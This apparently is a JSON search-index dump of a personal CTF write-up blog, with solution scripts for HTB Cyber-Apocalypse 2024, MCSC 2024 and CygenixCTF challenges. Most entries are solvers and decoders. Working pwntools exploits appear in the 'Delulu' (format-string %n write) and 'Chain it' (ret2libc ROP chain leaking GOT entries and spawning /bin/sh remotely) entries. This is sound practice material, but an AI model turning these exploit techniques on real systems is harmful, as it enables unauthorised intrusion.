Squares","uri":"/colored-squares/"},{"categories":["Writeups"],"content":"In the heart of an ancient forest stands a coloured towering tree, its branches adorned with countless doors. Each door, when opened, reveals a labyrinth of branching paths, leading to more doors beyond. As you venture deeper into the maze, the forest seems to come alive with whispered secrets and shifting shadows. With each door opened, the maze expands, presenting new choices and challenges at every turn. Can you understand what’s going on and get out of this maze? from z3 import * flag = BitVecs('v0 v1 v2 v3 v4 v5 v6 v7 v8 v9 v10 v11 v12 v13 v14 v15 v16 v17 v18 v19 v20 v21', 8) s = Solver() for i in range(len(flag)): s.add(flag[i] \u003e= 48) s.add(flag[i] \u003c= 125) s.add(flag[0] == ord('H')) s.add(flag[1] == ord('T')) s.add(flag[2] == ord('B')) s.add(flag[3] == ord('{')) s.add(flag[21] == ord('}')) # Additional constraints s.add(flag[7] - flag[18] == flag[8] - flag[9]) s.add(flag[6] + flag[10] == flag[16] + flag[20] + 12) s.add(flag[8] * flag[14] == 2 * flag[18] * flag[13]) s.add(flag[19] == flag[6]) s.add(flag[9] + 1 == flag[17] - 1) s.add(flag[11] == 2 * (flag[5] + 7)) s.add(flag[5] + flag[2]/2 == flag[1]) s.add(flag[16] - 9 == flag[13] + 4) s.add(flag[12] == 17 * 3) s.add(flag[4] - flag[5] + flag[12] == flag[14] + 20) s.add(flag[12] * flag[15] == 24 * flag[14]) s.add(flag[18] + flag[4] == 173) s.add(flag[6] == flag[5] + 63) s.add(flag[16] * 32 == flag[0] * flag[7]) s.add(flag[17] - flag[15] == flag[18] + 1) s.add(flag[20] == ord('s')) if s.check() == sat: m = s.model() result = ''.join([chr(m.evaluate(flag[i]).as_long()) for i in range(len(flag))]) print(\"Flag:\", result) else: print(\"No solution found.\") ","date":"2024-08-27","objectID":"/colored-squares/:0:0","tags":["MISC","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - Colored Squares","uri":"/colored-squares/"},{"categories":["Writeups"],"content":"Explanation Solves for a 22-character flag using Z3 solver -\u003e imposes constraints on flag characters -\u003e finds valid flag satisfying all conditions. ","date":"2024-08-27","objectID":"/colored-squares/:1:0","tags":["MISC","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - Colored Squares","uri":"/colored-squares/"},{"categories":["Writeups"],"content":"HTB Cyber-Apocalypse 2024 - Delulu","date":"2024-08-27","objectID":"/delulu/","tags":["PWN","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - Delulu","uri":"/delulu/"},{"categories":["Writeups"],"content":"Delulu is a very easy difficulty challenge that features format string vulnerability, overwriting a variable’s value. from pwn import * #nc 83.136.251.235 53824 # Start the process p = process('./delulu') #nc 94.237.49.116 55529 #p = remote('94.237.51.233',44897) gdb.attach(p, gdbscript=\"b *main+134\\n continue\") print(p.recv().decode()) pay = b'\\xf8\\xdd\\xff\\xff\\xff\\x7f' #pay += b'\\xf8\\xdd\\xff\\xff\\xff\\x7f' pay += b'%7$n' #pay += b'%48867x%7$hn%48879x%8$hn' # Send the payload without a newline p.send(pay) print(p.recvall()) ","date":"2024-08-27","objectID":"/delulu/:0:0","tags":["PWN","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - Delulu","uri":"/delulu/"},{"categories":["Writeups"],"content":"Explanation Starts a local process of delulu binary for exploitation -\u003e attaches gdb for debugging and sets a breakpoint -\u003e creates a format string payload to write data to a specified address -\u003e sends the payload to the process and prints the output. ","date":"2024-08-27","objectID":"/delulu/:1:0","tags":["PWN","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - Delulu","uri":"/delulu/"},{"categories":["Writeups"],"content":"HTB Cyber-Apocalypse 2024 - Metagaming","date":"2024-08-27","objectID":"/metagaming/","tags":["REVERSE","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - Metagaming","uri":"/metagaming/"},{"categories":["Writeups"],"content":"You come across an enemy faction, who have banded together and gathered their resources. You’ll need to outwit them, thinking outside the box- can you beat them before they even begin to run? from z3 import * payload = [ [12,13,10], [21,0,0], [0,13,13], [0,14,0], [15,11,12], [24,14,0], [5,0,14], [0,14,1], [7,11,11], [24,14,8], [5,0,14], [0,14,2], [2,10,11], [24,14,16], [18,12,11], [5,0,14], [0,14,3], [0,11,11], [24,14,24], [13,10,10], [5,0,14], [2,11,13], [21,1,0], [0,14,4], [24,14,0], [5,1,14], [6,11,12], [0,14,5], [8,10,10], [24,14,8], [11,12,11], [5,1,14], [0,14,6], [0,12,10], [24,14,16], [9,10,13], [5,1,14], [0,14,7], [13,12,12], [24,14,24], [15,10,12], [5,1,14], [21,2,0], [20,13,13], [0,14,8], [24,14,0], [19,10,11], [5,2,14], [6,12,10], [0,14,9], [8,11,11], [24,14,8], [5,2,14], [0,14,10], [4,11,12], [24,14,16], [5,2,14], [0,14,11], [24,14,24], [4,13,12], [5,2,14], [21,3,0], [14,10,12], [0,14,12], [13,10,11], [24,14,0], [16,10,10], [5,3,14], [5,11,12], [0,14,13], [12,10,13], [24,14,8], [2,10,13], [5,3,14], [20,11,11], [0,14,14], [24,14,16], [18,13,11], [5,3,14], [6,11,13], [0,14,15], [24,14,24], [4,11,10], [5,3,14], [21,4,0], [15,13,11], [0,14,16], [6,10,10], [24,14,0], [14,10,12], [5,4,14], [0,14,17], [12,13,13], [24,14,8], [19,11,10], [5,4,14], [0,14,18], [17,13,12], [24,14,16], [5,4,14], [0,14,19], [24,14,24], [21,12,10], [5,4,14], [13,13,10], [21,5,0], [0,14,20], [19,10,13], [24,14,0], [5,5,14], [0,14,21], [24,14,8], [8,13,13], [5,5,14], [0,14,22], [16,13,11], [24,14,16], [10,10,13], [5,5,14], [7,10,12], [0,14,23], [19,13,10], [24,14,24], [5,5,14], [17,12,10], [21,6,0], [16,11,10], [0,14,24], [24,14,0], [10,11,10], [5,6,14], [0,14,25], [24,14,8], [7,10,12], [5,6,14], [0,14,26], [16,12,11], [24,14,16], [3,11,10], [5,6,14], [15,11,13], [0,14,27], [4,12,13], [24,14,24], [5,6,14], [14,11,13], [21,7,0], [0,14,28], [21,13,11], [24,14,0], [7,12,11], [5,7,14], [17,11,10], [0,14,29], [24,14,8], [5,7,14], [0,14,30], [12,10,10], [24,14,16], [5,7,14], [0,14,31], [20,10,10], [24,14,24], [5,7,14], [21,8,0], [18,10,12], [0,14,32], [9,11,11], [24,14,0], [21,12,11], [5,8,14], [0,14,33], [24,14,8], [19,10,13], [5,8,14], [8,12,13], [0,14,34], [24,14,16], [5,8,14], [8,10,10], [0,14,35], [24,14,24], [21,13,10], [5,8,14], [0,12,10], [21,9,0], [0,14,36], [24,14,0], [5,9,14], [17,11,11], [0,14,37], [14,10,13], [24,14,8], [5,9,14], [4,10,11], [0,14,38], [13,11,13], [24,14,16], [5,9,14], [0,14,39], [10,11,10], [24,14,24], [20,13,13], [5,9,14], [6,12,11], [21,14,0], [8,0,2769503260], [10,0,997841014], [19,12,11], [2,0,4065997671], [5,13,11], [8,0,690011675], [15,11,11], [8,0,540576667], [2,0,1618285201], [8,0,1123989331], [8,0,1914950564], [8,0,4213669998], [21,13,11], [8,0,1529621790], [10,0,865446746], [2,10,11], [8,0,449019059], [16,13,11], [8,0,906976959], [6,10,10], [8,0,892028723], [10,0,1040131328], [2,0,3854135066], [2,0,4133925041], [2,0,1738396966], [2,12,12], [8,0,550277338], [10,0,1043160697], [2,1,1176768057], [10,1,2368952475], [8,12,11], [2,1,2826144967], [8,1,1275301297], [10,1,2955899422], [2,1,2241699318], [12,11,10], [8,1,537794314], [11,13,10], [8,1,473021534], [17,12,13], [8,1,2381227371], [10,1,3973380876], [10,1,1728990628], [6,11,13], [8,1,2974252696], [0,11,11], [8,1,1912236055], [2,1,3620744853], [3,10,13], [2,1,2628426447], [11,13,12], [10,1,486914414], [16,11,12], [10,1,1187047173], [14,12,11], [2,2,3103274804], [13,10,10], [8,2,3320200805], [8,2,3846589389], [1,13,13], [2,2,2724573159], [10,2,1483327425], [2,2,1957985324], [14,13,12], [10,2,1467602691], [8,2,3142557962], [2,13,12], [2,2,2525769395], [8,2,3681119483], [8,12,11], [10,2,1041439413], [10,2,1042206298], [2,2,527001246], [20,10,13], [10,2,855860613], [8,10,10], [8,2,1865979270], [1,13,10], [8,2,2752636085], [2,2,1389650363], [10,2,2721642985], [18,10,11], [8,2,3276518041], [15,10,10], [2,2,1965130376], [2,3,3557111558], [2,3,3031574352], [16,12,10], [10,3,4226755821], [8,3,2624879637], [8,3,1381275708], [2,3,3310620882], [2,3,2475591380], [8,3,405408383], ","date":"2024-08-27","objectID":"/metagaming/:0:0","tags":["REVERSE","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - Metagaming","uri":"/metagaming/"},{"categories":["Writeups"],"content":"Explanation Solves for a 40-character flag using Z3 solver -\u003e imposes constraints on flag characters and register values -\u003e executes instructions to transform registers -\u003e ensures final register values match specified values -\u003e finds valid flag satisfying all conditions. ","date":"2024-08-27","objectID":"/metagaming/:1:0","tags":["REVERSE","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - Metagaming","uri":"/metagaming/"},{"categories":["Writeups"],"content":"HTB Cyber-Apocalypse 2024 - QuickScan","date":"2024-08-27","objectID":"/quickscan/","tags":["MISC","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - QuickScan","uri":"/quickscan/"},{"categories":["Writeups"],"content":"QuickScan is a Medium reversing challenge. Players will be sent a series of small, randomly generated ELF files and must rapidly and automatically anlalyse them in order to extract required data. from pwn import * #94.237.62.48 32757 p = remote('94.237.62.48',32757) m = (p.recv()) print(m.decode()) def find_substring_index(string, substring): index = string.find(substring) + len(substring) return index while True: start_index = m.find(b\"ELF: \") + len(b\"ELF: \") end_index = m.find(b\"\\n\", start_index) elf_data_base64 = m[start_index:end_index] # Decode base64-encoded ELF data elf_data = base64.b64decode(elf_data_base64) hexxer = elf_data.hex() substring = \"488d35\" index = find_substring_index(hexxer, substring) padding = int.from_bytes(bytes.fromhex(hexxer[index:index+8]), byteorder='little', signed=True)*2 start = index+8 end = start+padding r = hexxer[end:end+48] print(hexxer) p.sendline(r) m = p.recv() print(m.decode()) ","date":"2024-08-27","objectID":"/quickscan/:0:0","tags":["MISC","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - QuickScan","uri":"/quickscan/"},{"categories":["Writeups"],"content":"Explanation Decodes ELF binary from Base64 -\u003e converts to hex -\u003e finds substring index for opcode I forgot about -\u003e calculates padding -\u003e extracts and prints portion of hex data based on padding. ","date":"2024-08-27","objectID":"/quickscan/:1:0","tags":["MISC","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - QuickScan","uri":"/quickscan/"},{"categories":["Writeups"],"content":"HTB Cyber-Apocalypse 2024 - Writing on the Wall","date":"2024-08-27","objectID":"/writing-on-the-wall/","tags":["PWN","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - Writing on the Wall","uri":"/writing-on-the-wall/"},{"categories":["Writeups"],"content":"As you approach a password-protected door, a sense of uncertainty envelops you—no clues, no hints. Yet, just as confusion takes hold, your gaze locks onto cryptic markings adorning the nearby wall. Could this be the elusive password, waiting to unveil the door’s secrets? from pwn import * #nc 83.136.251.235 53824 # Start the process #p = process('./writing_on_the_wall') p = remote('83.136.251.235',53824) #gdb.attach(p, gdbscript=\"b *main+77\\n continue\") print(p.recv().decode()) # Send the payload without a newline p.send(b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00') print(p.recvall().decode()) ","date":"2024-08-27","objectID":"/writing-on-the-wall/:0:0","tags":["PWN","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - Writing on the Wall","uri":"/writing-on-the-wall/"},{"categories":["Writeups"],"content":"Explanation 9 null bytes to manipulate the data ","date":"2024-08-27","objectID":"/writing-on-the-wall/:1:0","tags":["PWN","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - Writing on the Wall","uri":"/writing-on-the-wall/"},{"categories":["Writeups"],"content":"Writeup for Q4N1 challenge.","date":"2024-08-27","objectID":"/circuits/","tags":["Misc","MCSC","2024"],"title":"MCSC 2024 - Q4N1","uri":"/circuits/"},{"categories":["Writeups"],"content":"Writeup for Quantum challenge from MCSC 2024. from qiskit import QuantumCircuit, execute, Aer # Create a quantum circuit with 7 qubits and 7 classical bits circuit = QuantumCircuit(7, 7) # Apply the gates from your OPENQASM code circuit.cz(2, 4) circuit.z(2) circuit.cy(2, 4) # ... (add the remaining gates) # Measure all qubits circuit.measure(range(7), range(7)) # Choose a backend (simulator or real quantum computer) simulator = Aer.get_backend('qasm_simulator') # Execute the circuit and get the counts job = execute(circuit, backend=simulator, shots=1024) # Increase shots for better statistics counts = job.result().get_counts() # Print the measurement results print(counts) ","date":"2024-08-27","objectID":"/circuits/:0:0","tags":["Misc","MCSC","2024"],"title":"MCSC 2024 - Q4N1","uri":"/circuits/"},{"categories":["Writeups"],"content":"Explanation You create a quantum circuit with 7 qubits and 7 classical bits, where quantum operations are performed on the qubits, and the classical bits store the measurement results. Several quantum gates are applied, including a controlled-Z gate (cz) where qubit 2 controls qubit 4, a Z gate that flips the phase of qubit 2, and a controlled-Y gate (cy) with qubit 2 as the control and qubit 4 as the target. After adding the necessary gates, all 7 qubits are measured, with the results stored in the corresponding classical bits. The circuit is then simulated using the qasm_simulator backend, which mimics a real quantum computer. The circuit is executed 1024 times to gather statistical outcomes, and the measurement results are retrieved and displayed as a dictionary, showing the frequency of each possible outcome in binary form. ","date":"2024-08-27","objectID":"/circuits/:1:0","tags":["Misc","MCSC","2024"],"title":"MCSC 2024 - Q4N1","uri":"/circuits/"},{"categories":["Writeups"],"content":"Writeup for zipbomb challenge.","date":"2024-08-27","objectID":"/zipbomb/","tags":["Misc","MCSC","2024"],"title":"MCSC 2024 - Zipbomb","uri":"/zipbomb/"},{"categories":["Writeups"],"content":"Writeup for Zipbomb challenge from MCSC 2024. import base64 import string import gzip import binascii import io import py7zr import os import re brail=\"⠴⠂⠆⠒⠲⠢⠖⠶⠦⠔⠁⠃⠉⠙⠑⠋⠛⠓⠊⠚⠅⠇⠍⠝⠕⠏⠟⠗⠎⠞⠥⠧⠺⠭⠽⠵⠁⠃⠉⠙⠑⠋⠛⠓⠊⠚⠅⠇⠍⠝⠕⠏⠟⠗⠎⠞⠥⠧⠺⠭⠽⠵⠮⠐⠼⠫⠩⠯⠄⠷⠾⠡⠬⠠⠤⠨⠌⠱⠰⠣⠿⠜⠹⠈⠪⠳⠻⠘⠸\" strings = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\\\"#$%\u0026'()*+,-./:;\u003c=\u003e?@[\\\\]^_\" def contains_braille(text): brail = \"⠴⠂⠆⠒⠲⠢⠖⠶⠦⠔⠁⠃⠉⠙⠑⠋⠛⠓⠊⠚⠅⠇⠍⠝⠕⠏⠟⠗⠎⠞⠥⠧⠺⠭⠽⠵⠁⠃⠉⠙⠑⠋⠛⠓⠊⠚⠅⠇⠍⠝⠕⠏⠟⠗⠎⠞⠥⠧⠺⠭⠽⠵⠮⠐⠼⠫⠩⠯⠄⠷⠾⠡⠬⠠⠤⠨⠌⠱⠰⠣⠿⠜⠹⠈⠪⠳⠻⠘⠸\" for char in text: if char in brail: return True return False def contains_hexadecimal(text): return all(c in string.hexdigits for c in text) def contains_non_printables(text): # Iterate over each character in the text for char in text: # Check if the character is non-printable or matches specific value like 'ÿ' if not char.isprintable(): return True # If no non-printable characters are found, return False return False def convertbraille(text): result = \"\" for char in text: result += strings[brail.index(char)] return result def hex_to_string(hex_str): try: # Convert hexadecimal string to bytes hex_bytes = bytes.fromhex(hex_str) # Convert bytes to string return hex_bytes.decode('ascii') except Exception as e: print(\"Error:\", e) return None def gunzip_bytes_obj(text): text = text.encode('latin1') text = gzip.GzipFile(fileobj=io.BytesIO(text), mode='rb') text = text.read().decode('utf-8') return text def is_base32(s): # Define the Base32 alphabet s=s.upper() print(s) base32_alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567' # Check if all characters in the string are part of the Base32 alphabet for char in s: if char not in base32_alphabet: if char==\"=\": return True return False return True def extract_7z_with_password(archive_path, output_dir, password): try: # Open the 7z archive with the provided password with py7zr.SevenZipFile(archive_path, mode='r', password=password) as z: # Extract all files to the specified output directory z.extractall(path=output_dir) print(f\"Extraction of {archive_path} successful!\") os.chdir(output_dir) except Exception as e: print(f\"Extraction of {archive_path} failed:\", e) def extract_from_directory(directory, output_dir, password): # Iterate through files in the directory for filename in os.listdir(directory): if filename.endswith(\".7z\"): # Check if the file ends with \".7z\" # Construct the full path to the 7z archive archive_path = os.path.join(directory, filename) # Attempt to extract the 7z archive extract_7z_with_password(archive_path, output_dir, password) #while True: i=1 while True: with open('crack_me', 'r',encoding='utf-8') as file: # Read the entire contents of the file text = file.read() with open('backup_me', 'x',encoding='utf-8') as file: file.write(text) # Now 'text' contains the contents of the file while (type(text) == str): if contains_braille(text): text=convertbraille(text) elif contains_non_printables(text): text=gunzip_bytes_obj(text) elif contains_hexadecimal(text): text = ''.join([chr(int(text[i:i+2], 16)) for i in range(0, len(text), 2)]) else : text=text.upper() text = base64.b32decode(text).decode('utf-8') print(text,end=\"\\n\\n\") if len(text) \u003c= len(\"SKOWJUHYISBWNOQMZUOQOZXZPOTVAW\") : if contains_braille(text)==False: break text=text.upper() extract_from_directory('.', './'+str(i), text) i+=1 ","date":"2024-08-27","objectID":"/zipbomb/:0:0","tags":["Misc","MCSC","2024"],"title":"MCSC 2024 - Zipbomb","uri":"/zipbomb/"},{"categories":["Writeups"],"content":"Explanation It’s a simple automation of the decoding steps The logic goes : detect if it’s braille hex or gunzipped, decode it, cd to the new directory,rinse and repeat. ","date":"2024-08-27","objectID":"/zipbomb/:1:0","tags":["Misc","MCSC","2024"],"title":"MCSC 2024 - Zipbomb","uri":"/zipbomb/"},{"categories":["Writeups"],"content":"CygenixCTF - Chain it","date":"2024-08-26","objectID":"/chainit/","tags":["PWN","CygenixCTF"],"title":"CygenixCTF - Chain it","uri":"/chainit/"},{"categories":["Writeups"],"content":"Where there is code, there is a way in. #setup pwntools from pwn import * context(arch='amd64', os='linux') #setup binary exe = ELF('./main') p = process(exe.path) context.log_level = \"critical\" #nc 134.209.150.149 4444 p = remote(\"134.209.150.149\", 4444) # Calculate the offset to the return address offset = 40 # 32 bytes for the buffer + 8 bytes for saved RBP # Find the address of the win function (replace with the correct function) id_addr = exe.symbols['id'] # Assuming there's a win function # Print the win function address print(\"id function address: \" + hex(id_addr)) # Addresses ret_addr = 0x0000000000401016 pop_rdi = 0x000000000040115a #GOT puts_got = exe.got['puts'] #PLT puts_plt = exe.plt['puts'] #main main = exe.symbols['main'] #payload to leak puts payload = flat( b'A' * offset, # Overflow buffer and overwrite RBP ret_addr, pop_rdi, # Overwrite return address with win() function address puts_got, # Overwrite return address with win() function address puts_plt, main ) # Send the payload p.sendline(payload) p.recvline() p.recvline() p.recvline() puts_leak = u64(p.recvline().strip().ljust(8, b\"\\x00\")) print(f\"puts@GLIBC: {hex(puts_leak)}\") #leak gets payload = flat( b'A' * offset, # Overflow buffer and overwrite RBP ret_addr, pop_rdi, # Overwrite return address with win() function address exe.got['gets'], # Overwrite return address with win() function address puts_plt, main ) # Send the payload p.sendline(payload) p.recvline() p.recvline() p.recvline() gets_leak = u64(p.recvline().strip().ljust(8, b\"\\x00\")) print(f\"gets@GLIBC: {hex(gets_leak)}\") #download libc libc_filename = libcdb.search_by_symbol_offsets({'puts': puts_leak, 'gets': gets_leak}, select_index=1) libc = ELF(libc_filename) libc.address = puts_leak - libc.sym['puts'] #system system = libc.sym['system'] bin_sh = next(libc.search(b'/bin/sh\\x00')) # Final exploit payload = flat( b'A' * offset, # Overflow buffer and overwrite RBP ret_addr, pop_rdi, # Overwrite return address with win() function address bin_sh, # Overwrite return address with win() function address system, ) p.sendline(payload) p.interactive() ","date":"2024-08-26","objectID":"/chainit/:0:0","tags":["PWN","CygenixCTF"],"title":"CygenixCTF - Chain it","uri":"/chainit/"},{"categories":["Writeups"],"content":"Explanation Leak puts and gets using buffer overflow + pop rdi and ret -\u003e getting the right libc with this new info -\u003e remote shell ","date":"2024-08-26","objectID":"/chainit/:1:0","tags":["PWN","CygenixCTF"],"title":"CygenixCTF - Chain it","uri":"/chainit/"},{"categories":null,"content":"About Me","date":"0001-01-01","objectID":"/aboutme/","tags":null,"title":"About Me","uri":"/aboutme/"},{"categories":null,"content":"Background Information I like computers 🤓❗ ","date":"0001-01-01","objectID":"/aboutme/:0:0","tags":null,"title":"About Me","uri":"/aboutme/"}]